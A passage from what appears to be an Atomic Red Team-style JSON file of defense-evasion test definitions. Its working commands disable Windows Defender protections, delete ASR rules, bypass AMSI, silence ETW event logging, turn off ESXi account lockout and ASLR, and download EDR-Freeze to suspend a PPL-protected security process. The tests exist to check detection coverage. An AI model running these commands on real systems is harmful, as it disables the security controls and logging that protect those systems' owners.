\nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" -Name \"DisableBlockAtFirstSeen\" -Value 1 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\SpyNet\" -Name \"SpynetReporting\" -Value 0 \nSet-ItemProperty \"HKLM:\\Software\\Policies\\Microsoft\\Windows Defender\\MpEngine\" -Name \"MpEnablePus\" -Value 0 \nSet-ItemProperty \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender Security Center\\App and Browser protection\" -Name \"DisallowExploitProtectionOverride\" -Value 0 \nSet-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows Defender\\Features\" -Name \"TamperProtection\"  -Value 0 \nSet-ItemProperty \"HKLM:\\software\\microsoft\\windows defender\\spynet\" -Name \"SubmitSamplesConsent\" -Value 0 \nSet-ItemProperty \"HKLM:\\Software\\Microsoft\\Windows Defender\" -Name \"PUAProtection\" -Value 0"
      },
      "input_arguments": [],
      "auto_generated_guid": "a72cfef8-d252-48b3-b292-635d332625c3"
    },
    {
      "name": "ESXi - Disable Account Lockout Policy via PowerCLI",
      "description": "An adversary may disable account lockout policy within ESXi to have the ability to prevent defensive actions from being enforced in the future or to prevent future alerting.",
      "supported_platforms": [
        "linux"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": true,
        "procedure": "Set-PowerCLIConfiguration -InvalidCertificateAction Ignore -ParticipateInCEIP:$false -Confirm:$false \nConnect-VIServer -Server #{vm_host} -User #{vm_user} -Password #{vm_pass}\nGet-AdvancedSetting -Entity #{vm_host} -Name 'Security.AccountLockFailures' | Set-AdvancedSetting -Value '0' -Confirm:$false\nDisconnect-VIServer -Confirm:$false"
      },
      "input_arguments": [
        {
          "arg_name": "vm_host",
          "description": "Specify the host name of the ESXi Server",
          "type": "string",
          "default": "atomic.local"
        },
        {
          "arg_name": "vm_user",
          "description": "Specify the privilege user account on ESXi Server",
          "type": "string",
          "default": "root"
        },
        {
          "arg_name": "vm_pass",
          "description": "Specify the privilege user password on ESXi Server",
          "type": "string",
          "default": "pass"
        }
      ],
      "dependencies": [
        {
          "description": "Check if VMWARE PowerCLI PowerShell Module is installed.",
          "prereq_command": "$RequiredModule = Get-Module -Name VMware.PowerCLI -ListAvailable\nif (-not $RequiredModule) {exit 1}",
          "get_prereq_command": "Install-Module -Name VMware.PowerCLI -Confirm:$false"
        }
      ],
      "auto_generated_guid": "091a6290-cd29-41cb-81ea-b12f133c66cb"
    },
    {
      "name": "Delete Microsoft Defender ASR Rules - InTune",
      "description": "This test simulates the deletion of the ASR rules loaded by Microsoft Defender using the registry. Depending on the deployment, rules can be pushed either using GPO or InTune, This test simulates an InTune-based rules deployment.",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": true,
        "procedure": "$registryPath = \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Policy Manager\"\n\nif (-not (Test-Path $registryPath)) {\n  New-Item -Path $registryPath -Force\n  Write-Host \"Registry key created: $registryPath\"\n}\n\n$registryValueName = \"ASRRules\"\n\nif (Test-Path \"$registryPath\\$registryValueName\") {\n  Remove-ItemProperty -Path $registryPath -Name $registryValueName\n  Write-Host \"Registry value deleted: $registryValueName\"\n} else {\n  New-ItemProperty -Path $registryPath -Name $registryValueName -PropertyType String -Value \"36190899-1602-49e8-8b27-eb1d0a1ce869=1\" -Force\n  Write-Host \"Registry value created: $registryValueName\"\n}\n\n\nRemove-ItemProperty -Path $registryPath -Name $registryValueName\nWrite-Host \"Registry value deleted: $registryValueName\""
      },
      "input_arguments": [],
      "auto_generated_guid": "eea0a6c2-84e9-4e8c-a242-ac585d28d0d1"
    },
    {
      "name": "Delete Microsoft Defender ASR Rules - GPO",
      "description": "This test simulates the deletion of the ASR rules loaded by Microsoft Defender using the registry. Depending on the deployment, rules can be pushed either using GPO or InTune, This test simulates a GPO-based rules deployment.",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": true,
        "procedure": "$registryPath = \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Windows Defender Exploit Guard\\ASR\\Rules\"\n\nif (-not (Test-Path $registryPath)) {\n    New-Item -Path $registryPath -Force\n    Write-Host \"Registry key created: $registryPath\"\n}\n\n$newValueName = \"36190899-1602-49e8-8b27-eb1d0a1ce869\"\n$newValueData = \"1\"\nNew-ItemProperty -Path $registryPath -Name $newValueName -PropertyType String -Value $newValueData -Force\nWrite-Host \"Registry value created: $newValueName with data $newValueData\"\n\nRemove-ItemProperty -Path $registryPath -Name $newValueName\nWrite-Host \"Registry value deleted: $newValueName\""
      },
      "input_arguments": [],
      "auto_generated_guid": "0e7b8a4b-2ca5-4743-a9f9-96051abb6e50"
    },
    {
      "name": "AMSI Bypass - Create AMSIEnable Reg Key",
      "description": "Threat Actor could disable the AMSI function by adding a registry value name AmsiEnable to the registry key HKCU\\Software\\Microsoft\\Windows Script\\Settings\\AmsiEnable and set its value to 0.\nRef: https://mostafayahiax.medium.com/hunting-for-amsi-bypassing-methods-9886dda0bf9d",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": true,
        "cleanup_command": "Remove-Item -Path \"HKCU:\\Software\\Microsoft\\Windows Script\\Settings\" -Recurse -Force 2> $null",
        "procedure": "New-Item -Path \"HKCU:\\Software\\Microsoft\\Windows Script\\Settings\" -Force | Out-Null\nNew-ItemProperty -Path \"HKCU:\\Software\\Microsoft\\Windows Script\\Settings\" -Name \"AmsiEnable\" -Value 0 -PropertyType DWORD -Force | Out-Null"
      },
      "input_arguments": [],
      "auto_generated_guid": "728eca7b-0444-4f6f-ac36-437e3d751dc0"
    },
    {
      "name": "Disable EventLog-Application Auto Logger Session Via Registry - Cmd",
      "description": "This atomic simulates an activity where an attacker disables the EventLog-Application ETW Auto Logger session using the reg.exe utility to update the Windows registry value \"Start\". This would effectivly disable the Event log application channel. The changes would only take effect after a restart.",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "command_prompt",
        "elevation_required": true,
        "cleanup_command": "reg add \"HKLM\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application\" /v \"Start\" /t REG_DWORD /d \"1\" /f",
        "procedure": "reg add \"HKLM\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application\" /v \"Start\" /t REG_DWORD /d \"0\" /f"
      },
      "input_arguments": [],
      "auto_generated_guid": "653c6e17-14a2-4849-851d-f1c0cc8ea9ab"
    },
    {
      "name": "Disable EventLog-Application Auto Logger Session Via Registry - PowerShell",
      "description": "This atomic simulates an activity where an attacker disables the EventLog-Application ETW Auto Logger session using the powershell.exe \"New-ItemProperty\" cmdlet to update the Windows registry value \"Start\". This would effectivly disable the Event log application channel. The changes would only take effect after a restart.",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": true,
        "cleanup_command": "New-ItemProperty -Path HKLM:\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application -Name Start -Value 1 -PropertyType \"DWord\" -Force",
        "procedure": "New-ItemProperty -Path HKLM:\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application -Name Start -Value 0 -PropertyType \"DWord\" -Force"
      },
      "input_arguments": [],
      "auto_generated_guid": "da86f239-9bd3-4e85-92ed-4a94ef111a1c"
    },
    {
      "name": "Disable EventLog-Application ETW Provider Via Registry - Cmd",
      "description": "This atomic simulates an activity where an attacker disables a specific ETW provider from the EventLog-Application ETW Auto Logger session using the reg.exe utility to update the Windows registry value \"Enabled\". This would effectivly remove that provider from the session and cause to not emit any logs of that type. The changes would only take effect after a restart.",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "command_prompt",
        "elevation_required": true,
        "cleanup_command": "reg add \"HKLM\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application\\#{ETWProviderGUID}\" /v \"Enabled\" /t REG_DWORD /d \"1\" /f",
        "procedure": "reg add \"HKLM\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application\\#{ETWProviderGUID}\" /v \"Enabled\" /t REG_DWORD /d \"0\" /f"
      },
      "input_arguments": [
        {
          "arg_name": "ETWProviderGUID",
          "description": "Microsoft-Windows-SenseIR ETW Provider GUID",
          "type": "string",
          "default": "{B6D775EF-1436-4FE6-BAD3-9E436319E218}"
        }
      ],
      "auto_generated_guid": "1cac9b54-810e-495c-8aac-989e0076583b"
    },
    {
      "name": "Disable EventLog-Application ETW Provider Via Registry - PowerShell",
      "description": "This atomic simulates an activity where an attacker disables a specific ETW provider from the EventLog-Application ETW Auto Logger session using the powershell.exe \"New-ItemProperty\" cmdlet to update the Windows registry value \"Enabled\". This would effectivly remove that provider from the session and cause to not emit any logs of that type. The changes would only take effect after a restart.",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": true,
        "cleanup_command": "New-ItemProperty -Path \"HKLM:\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application\\#{ETWProviderGUID}\" -Name Enabled -Value 1 -PropertyType \"DWord\" -Force",
        "procedure": "New-ItemProperty -Path \"HKLM:\\System\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application\\#{ETWProviderGUID}\" -Name Enabled -Value 0 -PropertyType \"DWord\" -Force"
      },
      "input_arguments": [
        {
          "arg_name": "ETWProviderGUID",
          "description": "Microsoft-Windows-SenseIR ETW Provider GUID",
          "type": "string",
          "default": "{B6D775EF-1436-4FE6-BAD3-9E436319E218}"
        }
      ],
      "auto_generated_guid": "8f907648-1ebf-4276-b0f0-e2678ca474f0"
    },
    {
      "name": "Freeze PPL-protected process with EDR-Freeze",
      "description": "This test utilizes the tool EDR-Freeze, which leverages the native Microsoft binary WerFaultSecure.exe to suspend processes protected by the Protected Process Light mechanism. PPL is a Windows security feature designed to safeguard critical system processes  such as those related to antivirus, credential protection, and system integrity  from tampering or inspection. These processes operate in a restricted environment that prevents access even from administrators or debugging tools, unless the accessing tool is signed and trusted by Microsoft. By using WerFaultSecure.exe, which is inherently trusted by the operating system, EDR-Freeze is able to bypass these restrictions and temporarily freeze PPL-protected processes for analysis or testing purposes.",
      "supported_platforms": [
        "windows"
      ],
      "executor": {
        "name": "powershell",
        "elevation_required": true,
        "cleanup_command": "Remove-Item -Path $edrFreezeExe -Force -erroraction silentlycontinue\nWrite-Output \"File deleted: $edrFreezeExe\"",
        "procedure": "# Enable SeDebugPrivilege\nAdd-Type -TypeDefinition @\"\nusing System;\nusing System.Runtime.InteropServices;\n\npublic class TokenAdjuster {\n    [DllImport(\"advapi32.dll\", SetLastError = true)]\n    public static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);\n\n    [DllImport(\"advapi32.dll\", SetLastError = true)]\n    public static extern bool LookupPrivilegeValue(string lpSystemName, string lpName, out long lpLuid);\n\n    [DllImport(\"advapi32.dll\", SetLastError = true)]\n    public static extern bool AdjustTokenPrivileges(IntPtr TokenHandle, bool DisableAllPrivileges,\n        ref TOKEN_PRIVILEGES NewState, uint BufferLength, IntPtr PreviousState, IntPtr ReturnLength);\n\n    [StructLayout(LayoutKind.Sequential, Pack = 1)]\n    public struct TOKEN_PRIVILEGES {\n        public int PrivilegeCount;\n        public long Luid;\n        public int Attributes;\n    }\n\n    public const int SE_PRIVILEGE_ENABLED = 0x00000002;\n    public const uint TOKEN_ADJUST_PRIVILEGES = 0x0020;\n    public const uint TOKEN_QUERY = 0x0008;\n\n    public static bool EnableSeDebugPrivilege() {\n        IntPtr hToken;\n        if (!OpenProcessToken(System.Diagnostics.Process.GetCurrentProcess().Handle, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, out hToken))\n            return false;\n\n        long luid;\n        if (!LookupPrivilegeValue(null, \"SeDebugPrivilege\", out luid))\n            return false;\n\n        TOKEN_PRIVILEGES tp = new TOKEN_PRIVILEGES();\n        tp.PrivilegeCount = 1;\n        tp.Luid = luid;\n        tp.Attributes = SE_PRIVILEGE_ENABLED;\n\n        return AdjustTokenPrivileges(hToken, false, ref tp, 0, IntPtr.Zero, IntPtr.Zero);\n    }\n}\n\"@\n\n$result = [TokenAdjuster]::EnableSeDebugPrivilege()\nif ($result) {\n    Write-Host \"SeDebugPrivilege enabled successfully.\" -ForegroundColor Green\n} else {\n    Write-Host \"Failed to enable SeDebugPrivilege.\" -ForegroundColor Red\n    exit 1\n}\n\n# Get basic process info\n$process = Get-Process -Name $#{processName} -ErrorAction Stop\n$processName = $process.ProcessName\nWrite-Host \"Process Name: $processName)\"\nWrite-Host \"PID: $($process.Id)\"\n        \n# Get executable path and user info\n$query = \"SELECT * FROM Win32_Process WHERE Name = '$processName.exe'\"\n$wmiProcess = Get-WmiObject -Query $query\n\n$owner = $wmiProcess.GetOwner()\n    Write-Host \"User: $($owner.Domain)\\$($owner.User)\"\n\n\n# Get the folder of the current script\n$scriptFolder = Split-Path -Parent $MyInvocation.MyCommand.Definition\n\n# Download latest EDR-Freeze package and extract (force replace)\n$downloadUrl = \"https://github.com/TwoSevenOneT/EDR-Freeze/releases/download/main/EDR-Freeze_1.0.zip\"\n$zipPath = Join-Path $scriptFolder \"EDR-Freeze_1.0.zip\"\nWrite-Host \"Downloading latest EDR-Freeze from $downloadUrl\" -ForegroundColor Cyan\ntry {\n    Invoke-WebRequest -Uri $downloadUrl -OutFile $zipPath -UseBasicParsing -ErrorAction Stop\n    Write-Host \"Download completed: $zipPath\" -ForegroundColor Green\n    $extractFolder = $scriptFolder\n    if (Test-Path $zipPath) {\n        Write-Host \"Extracting archive to $extractFolder (overwriting existing files)\" -ForegroundColor Cyan\n        if (Test-Path $extractFolder) {\n            # Ensure target exe not locked; attempt to stop any running instance silently\n            Get-Process -Name \"EDR-Freeze_1.0\" -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue\n        }\n        Add-Type -AssemblyName System.IO.Compression.FileSystem 2>$null\n        # Custom extraction routine (overwrite existing) compatible with .NET Framework (no bool overwrite overload)\n        $archive = $null\n        try {\n            $archive = [System.IO.Compression.ZipFile]::OpenRead($zipPath)\n            foreach ($entry in $archive.Entries) {\n                if ([string]::IsNullOrWhiteSpace($entry.FullName)) { continue }\n                if ($entry.FullName.EndsWith('/')) { # directory entry\n                    $dirPath = Join-Path $extractFolder $entry.FullName\n                    if (-not (Test-Path $dirPath)) { New-Item -ItemType Directory -Path $dirPath -Force | Out-Null }\n                    continue\n                }\n                $destPath = Join-Path $extractFolder $entry.FullName\n                $destDir = Split-Path $destPath -Parent\n                if (-not (Test-Path $destDir)) { New-Item -ItemType Directory -Path $destDir -Force | Out-Null }\n                if (Test-Path $destPath) { Remove-Item -Path $destPath -Force -ErrorAction SilentlyContinue }\n                try {\n                    # Use static extension method (PowerShell 5.1 compatible)\n                    [System.IO.Compression.ZipFileExtensions]::ExtractToFile($entry, $destPath, $false)\n                } catch {\n                    Write-Host \"Failed to extract entry $($entry.FullName): $_\" -ForegroundColor Yellow\n                }\n            }\n            Write-Host \"Extraction completed.\" -ForegroundColor Green\n        } finally {\n            if ($archive) { $archive.Dispose() }\n        }\n    }\n} catch {\n    Write-Host \"Failed to download or extract EDR-Freeze: $_\" -ForegroundColor Red\n}\n\n# Wait 15s before putting targeted process before putting it in the comma\nWrite-Host \"Waiting 15s before putting $processName in the comma\" -ForegroundColor Yellow\nStart-Sleep -Seconds 5\nWrite-Host \"Waiting 10s before putting $processName in the comma\" -ForegroundColor Yellow\nStart-Sleep -Seconds 5\nWrite-Host \"Waiting 5s before putting $processName in the comma\" -ForegroundColor Yellow\nStart-Sleep -Seconds 3\nWrite-Host \"Waiting 2s before putting $processName in the comma\" -ForegroundColor Yellow\nStart-Sleep -Seconds 2\n\n# Put targeted  process in the comma for 15s\n# Discover the EDR-Freeze executable dynamically (pick most recent if multiple)\n$edrFreezeExeName = Get-ChildItem -Path $scriptFolder -Filter 'EDR-Freeze_*.exe' -ErrorAction SilentlyContinue |\n    Sort-Object LastWriteTime -Descending |\n    Select-Object -First 1 -ExpandProperty Name\nif (-not $edrFreezeExeName) {\n    Write-Host \"No EDR-Freeze executable (EDR-Freeze_*.exe) found in $scriptFolder\" -ForegroundColor Red\n    exit 1\n}\n\n$edrFreezeExe = Join-Path $scriptFolder $edrFreezeExeName\nWrite-Host \"Using EDR-Freeze executable: $edrFreezeExeName\" -ForegroundColor Cyan\nWrite-Host \"$processName putted in the comma for 15s, by targetting Process ID $($htaProcess.Id)\" -ForegroundColor Yellow\nStart-Process -FilePath $edrFreezeExe -ArgumentList (\"$($process.Id) 15000\") | Out-Null"
      },
      "input_arguments": [
        {
          "arg_name": "processName",
          "description": "PPL-protected process name to target",
          "type": "string",
          "default": "SecurityHealthService"
        }
      ],
      "auto_generated_guid": "cbb2573a-a6ad-4c87-aef8-6e175598559b"
    },
    {
      "name": "Disable ASLR Via sysctl parameters - Linux",
      "description": "Detects Execution of the `sysctl` command to set `kernel.randomize_va_space=0` which disables Address Space Layout Randomization (ASLR) in Linux.",
      "supported_platforms": [
        "linux"
      ],
      "executor": {
        "name": "bash",
        "elevation_required": true,
        "cleanup_command": "sysctl -w kernel.randomize_va_space=2",
        "procedure": "sysctl -w kernel.randomize_va_space=0"
      },
      "input_arguments": [],
      "auto_generated_guid": "ac333fe1-ce2b-400b-a117-538634427439"
    }
  ]
}